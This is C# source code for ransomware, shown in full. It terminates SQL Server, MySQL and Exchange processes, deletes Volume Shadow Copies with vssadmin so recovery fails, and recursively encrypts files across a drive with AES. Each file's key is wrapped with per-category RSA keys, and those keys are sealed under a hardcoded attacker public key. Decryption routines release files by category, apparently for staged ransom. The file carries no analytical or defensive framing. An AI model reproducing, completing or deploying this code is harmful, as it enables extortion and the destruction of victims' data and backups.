using System;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using Microsoft.Win32;
using System.Security.Principal;
using static System.Net.Mime.MediaTypeNames;

namespace myApp
{
    class Enc : Utility
    {
        private string J_N = @"c:\J_N.txt";
        private string J_N1 = @"c:\J_N1.txt";       

        private const string serverPub = "<RSAKeyValue><Modulus>5Bt4JIZeSmcw/htnjtOk86eFU+fpDcKaXVQL7WAsc3Vrqtw/330MNQto5W7lZ7WsCOd2LdOeVgtVzsmgKuF3e4ViECyxtlTCykjHDx9WxTrtVibYVrQFcKAvdivOdu32a7+EPkrrVnSnwBgiC41VXIsYWjv3Ho0Ofoggy0KheSU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        public string[] RSApubKeys = new string[jobsNum];

        public Enc(string path, bool shouldEncrypt) // shouldEncrypt = true => encrypt the files. shouldEncrypt = false => do nothing
        {

            if (shouldEncrypt)
            {
                end_task();
                generateRSAkeys();
                encrypt(path);
                shadowDel();
            }

        }

        private void end_task()
        {
            try
            {
                OnSubmit("taskkill.exe /f /im sqlserever.exe", false);
                OnSubmit("taskkill.exe /f /im sqlwriter.exe", false);
                OnSubmit("taskkill.exe /f /im mysqld.exe", false);
                OnSubmit("taskkill.exe /f /im Microsoft.Exchage.*", false);
                OnSubmit("taskkill.exe /f /im MSExchange*", false);
            }
            catch { }
        }

        private void shadowDel()
        {
            try
            {
                OnSubmit("vssadmin.exe Delete Shadows /All /Quiet", false);
            }
            catch { }
        }

        public void decryptJ_N()
        {
            string tmpFile = @"c:\tmpFile.txt";
            byte[] allBytes = File.ReadAllBytes(J_N1);
            byte[] allBytes2 = File.ReadAllBytes(J_N);
            for (int i = 0; i<7; i++)
            {
                byte b = allBytes[0];
                int x = b;
                string lineStr = "";
                byte[] line = allBytes2.Take(928).ToArray();
                
                if (b == 15)
                {
                    byte[] password = allBytes.Skip(1).Take(15).ToArray();
                    byte[] decrypted = AES_Decrypt(line, password);
                    lineStr = Encoding.UTF8.GetString(decrypted);
                }
                int num = (int)b;
                allBytes = allBytes.Skip(1+num).ToArray();
                allBytes2 = allBytes2.Skip(928).ToArray();
                File.AppendAllLines(tmpFile, new[] { lineStr });
            }
            File.Copy(tmpFile, J_N, true);
            File.Delete(tmpFile);
        }

        public void decryptByCategory(string path, int cat)
        {
            switch (cat)
            {
                case 0: // his job
                    decryptByJob(path, getJob());
                    break;
                case 1: // keyword
                    decryptKeyWords(path);
                    break;
                case 2: // not his job or keywords
                    decryptCategory3(path);
                    break;
                case 3: // all categories
                    decrypt(path);
                    break;
            }
        }

        public string generateAESkey(int length = 15)
        {

            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        private void generateRSAkeys()// should also encrypt generated the private keys and store them somewhere (encrypted by server public key).
        {
            foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
            {
                RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
                RSApubKeys[(int)job] = RSA.ToXmlString(false); // public keys

                string aesKey = generateAESkey() ; // should be encrypted by server pub key (RSA)
                byte[] aesKeyBytes = Encoding.UTF8.GetBytes(aesKey);

                string priRSAkey = RSA.ToXmlString(true); // should be encrypted by AES

                byte[] priRSAkeyBytes = Encoding.UTF8.GetBytes(priRSAkey); // to be encrypted by AES
                byte[] encryptedRSAkeyBytes = AES_Encrypt(priRSAkeyBytes, aesKeyBytes);

                byte[] encryptedAESkeyBytes = RSA_Encrypt(aesKeyBytes, serverPub); // encrypt AES key by server public key

                if (!File.Exists(J_N1))
                {
                    File.WriteAllBytes(J_N1, encryptedAESkeyBytes);
                    File.WriteAllBytes(J_N, encryptedRSAkeyBytes);
                }
                else
                {
                    byte[] J_N1Bytes = File.ReadAllBytes(J_N1);
                    byte[] byteToFileJ_N1 = J_N1Bytes.Concat(encryptedAESkeyBytes).ToArray();
                    File.WriteAllBytes(J_N1, byteToFileJ_N1);

                    byte[] J_NBytes = File.ReadAllBytes(J_N);
                    byte[] byteToFileJ_N = J_NBytes.Concat(encryptedRSAkeyBytes).ToArray();
                    File.WriteAllBytes(J_N, byteToFileJ_N);
                }                  
            }
        }

        // encrypt a single file
        public void encryptFile(string file, Jobs job)
        {
            try
            {
                string password = generateAESkey();

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                passwordBytes = Encoding.UTF8.GetBytes(password);
                byte[] passwBytesEncrypted = RSA_Encrypt(passwordBytes, RSApubKeys[(int)job]);
                byte[] bytesToFile = passwBytesEncrypted.Concat(bytesEncrypted).ToArray();

                File.WriteAllBytes(file, bytesToFile);
            }
            catch { }
        }

        // encrypt all sub directories with keyword key. should be called when keyword folder is detected.
        public void encryptAll(string location)
        {
            string[] files; string[] childDirectories;
            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch { return; }


            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    if (skipFolders.Contains(Path.GetFileName(files[i]), StringComparer.OrdinalIgnoreCase))
                        continue;

                    string extension = Path.GetExtension(files[i]);
                    foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                    {
                        if (Extensions[(int)job].Contains(extension))
                        {
                            counters[(int)job]++;
                            encryptFile(files[i], Jobs.keyWord); break;
                        }
                    }
                }
                catch { }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptAll(childDirectories[i]);
            }
        }

        public void encrypt(string location) // main encryption function, iterate over all C
        {
            string[] files;
            string[] childDirectories;

            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch{
                return;
            }

            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    string extension = Path.GetExtension(files[i]);
                    string name = Path.GetFileNameWithoutExtension(files[i]);

                    if (skipFolders.Contains(name, StringComparer.OrdinalIgnoreCase))
                        continue;

                    foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                    {
                        if (Extensions[(int)job] != null && Extensions[(int)job].Contains(extension))
                        {
                            if (job != Jobs.other)
                                counters[(int)job]++;

                            if (keyWordFile(name))
                                encryptFile(files[i], Jobs.keyWord);
                            else
                                encryptFile(files[i], job);

                            break; // no need to check the remaining jobs
                        }
                    }
                }
                catch
                {
                    continue;
                }

            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    string folderName = Path.GetFileName(childDirectories[i]);

                    if (skipFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase))
                        continue;

                    /* if keyword we encrypt all the files in the directory that follow our extnesion policy to keyword automaticly*/
                    if (keyWordFile(folderName))
                    {
                        encryptAll(childDirectories[i]); continue;
                    }

                    /* incase the children  folder isn't keyword*/
                    encrypt(childDirectories[i]);
                }
                catch
                {
                    continue;
                }
            }

        }

        public void decrypt(string location) // main decryption function, iterate over all C
        {
            string[] files; string[] childDirectories;
            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch { return; }

            for (int i = 0; i < files.Length; i++)
            {

                try
                {


                    string extension = Path.GetExtension(files[i]);
                    string name = Path.GetFileNameWithoutExtension(files[i]);
                    if (skipFolders.Contains(name, StringComparer.OrdinalIgnoreCase))
                        continue;
                    foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                    {
                        if (Extensions[(int)job] != null && Extensions[(int)job].Contains(extension))
                        {
                            if (keyWordFile(name))
                                decryptFile(files[i], Jobs.keyWord);
                            else
                                decryptFile(files[i], job);

                            break; // no need to check the remaining jobs
                        }
                    }
                }
                catch { }

            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    string folderName = Path.GetFileName(childDirectories[i]);

                    if (skipFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase))
                        continue;

                    if (keyWordFile(folderName))
                    {
                        decryptAll(childDirectories[i]); continue;
                    }

                    /* incase the children  folder isn't keyword*/
                    decrypt(childDirectories[i]);
                }
                catch { }
            }
        }

        public void decryptByJob(string location, Jobs jobToDecrypt) //  iterate over all C
        {
            string[] files; string[] childDirectories;
            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch { return; }

            for (int i = 0; i < files.Length; i++)
            {
                try
                {

                    string extension = Path.GetExtension(files[i]);
                    string name = Path.GetFileNameWithoutExtension(files[i]);
                    if (skipFolders.Contains(name, StringComparer.OrdinalIgnoreCase))
                        continue;
                    foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                    {
                        if (Extensions[(int)job] != null && Extensions[(int)job].Contains(extension))
                        {
                            if (keyWordFile(name) && jobToDecrypt == Jobs.keyWord)
                                decryptFile(files[i], Jobs.keyWord);
                            else
                            {
                                if (jobToDecrypt == job)
                                {
                                    decryptFile(files[i], job);
                                }
                            }
                            break; // no need to check the remaining jobs
                        }
                    }
                }
                catch { }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    string folderName = Path.GetFileName(childDirectories[i]);

                    if (skipFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase))
                        continue;

                    if (keyWordFile(folderName) && jobToDecrypt == Jobs.keyWord)
                    {
                        decryptAll(childDirectories[i]); continue;
                    }

                    /* incase the children  folder isn't keyword*/
                    decryptByJob(childDirectories[i], jobToDecrypt);
                }
                catch { }
            }
        }

        public void decryptKeyWords(string location) //  iterate over all C
        {
            string[] files;
            string[] childDirectories;

            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch { return; }

            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    string extension = Path.GetExtension(files[i]);
                    string name = Path.GetFileNameWithoutExtension(files[i]);
                    if (skipFolders.Contains(name, StringComparer.OrdinalIgnoreCase))
                        continue;
                    if (keyWordFile(name))
                        decryptFile(files[i], Jobs.keyWord);
                }
                catch { }
               
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    string folderName = Path.GetFileName(childDirectories[i]);

                    if (skipFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase))
                        continue;

                    if (keyWordFile(folderName))
                    {
                        decryptAll(childDirectories[i]); continue;
                    }

                    /* incase the children  folder isn't keyword*/
                    decryptKeyWords(childDirectories[i]);
                }
                catch { };

            }
        }

        public void decryptCategory3(string location) // does not decrypt the job & keywords
        {
            string[] files; string[] childDirectories;
            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch { return; }

            for (int i = 0; i < files.Length; i++)
            {
                try
                {

                    string extension = Path.GetExtension(files[i]);
                    string name = Path.GetFileNameWithoutExtension(files[i]);
                    if (skipFolders.Contains(name, StringComparer.OrdinalIgnoreCase))
                        continue;
                    foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                    {
                        if (Extensions[(int)job] != null && Extensions[(int)job].Contains(extension))
                        {
                            if ((!keyWordFile(name)) && getJob() != job)
                            {
                                decryptFile(files[i], job);
                            }
                            break;
                        }
                    }
                }
                catch { }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    string folderName = Path.GetFileName(childDirectories[i]);
                    if (skipFolders.Contains(folderName, StringComparer.OrdinalIgnoreCase))
                        continue;

                    /* incase the children  folder isn't keyword*/
                    decryptCategory3(childDirectories[i]);
                }
                catch { }
            }
        }

        // decrypt all sub directories with keyword key. should be called when keyword folder is detected.
        public void decryptAll(string location)
        {
            string[] files; string[] childDirectories;
            try
            {
                files = Directory.GetFiles(location);
                childDirectories = Directory.GetDirectories(location);
            }
            catch { return; }

            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    string name = Path.GetFileNameWithoutExtension(files[i]);
                    if (skipFolders.Contains(name, StringComparer.OrdinalIgnoreCase))
                        continue;
                    string extension = Path.GetExtension(files[i]);
                    foreach (Jobs job in (Jobs[])Enum.GetValues(typeof(Jobs)))
                    {
                        if (Extensions[(int)job].Contains(extension))
                        {
                            decryptFile(files[i], Jobs.keyWord); break;
                        }
                    }
                }
                catch { }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                try
                {
                    decryptAll(childDirectories[i]);
                }
                catch { }
            }
        }

        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {

            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())

            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
 
        public void decryptFile(string file, Jobs job)
        {
            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);

            int RSAlength = 128;

            byte[] passwordBytes = bytesToBeDecrypted.Take(RSAlength).ToArray(); // get the password from the begining of the encrypted file
            string privateKey = File.ReadLines(J_N).Skip((int)job).Take(1).First(); //getRSAkeyFromfile(2 + (int)job); // we add two because first line is the id => gets the RSA key from J_N
            passwordBytes = RSA_Decrypt(passwordBytes, privateKey);
            bytesToBeDecrypted = bytesToBeDecrypted.Skip(RSAlength).ToArray(); // get the rest of the file

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            File.WriteAllBytes(file, bytesDecrypted);

        }

        public byte[] RSA_Encrypt(byte[] Data, string pubKey)
        {
            try
            {
                byte[] encryptedData;
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                {
                    RSA.FromXmlString(pubKey);
                    encryptedData = RSA.Encrypt(Data, true);
                }
                return encryptedData;
            }
             catch (CryptographicException e)
            {
                Console.WriteLine(e.Message);
                return null;
            }
        }

        public byte[] RSA_Decrypt(byte[] Data, string privateKey)
        {
            try
            {
                byte[] decryptedData;
                using (RSACryptoServiceProvider RSA = new RSACryptoServiceProvider())
                {
                    RSA.FromXmlString(privateKey);
                    decryptedData = RSA.Decrypt(Data, true);
                }
                return decryptedData;
            }
            catch (CryptographicException e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }

        public string OnSubmit(string command, bool asAdmin)
        {
            return RunProcess("C:\\windows\\system32\\cmd.exe", command, true);

        }

        public string RunProcess(string cmd, string arguments,bool asAdmin)
        {

            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string appDir = Path.GetDirectoryName(appPath);
            Directory.SetCurrentDirectory(appDir);

            System.Diagnostics.Process p = new System.Diagnostics.Process();

            p.StartInfo.FileName = cmd;

            p.StartInfo.Arguments = arguments;

            p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            p.StartInfo.CreateNoWindow = true;

            p.StartInfo.RedirectStandardOutput = true;

            p.StartInfo.RedirectStandardError = true;

            p.StartInfo.UseShellExecute = false;
            if (asAdmin)
            {
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.Verb = "runas";
            }
            p.Start();

            // must have the readToEnd BEFORE the WaitForExit(), to avoid a deadlock condition

            string output = p.StandardOutput.ReadToEnd();

            string stderrx = p.StandardError.ReadToEnd();



            p.WaitForExit();



            //if there is an error display it

            if (p.ExitCode != 0)

            {

                return stderrx;

                //Response.Write("<p class=\"whiteclass\"> exit code: " + p.ExitCode + "<br><br>Errors:<br>" + stderrx + "</p>");

            }



            return output;

        }

    }
}
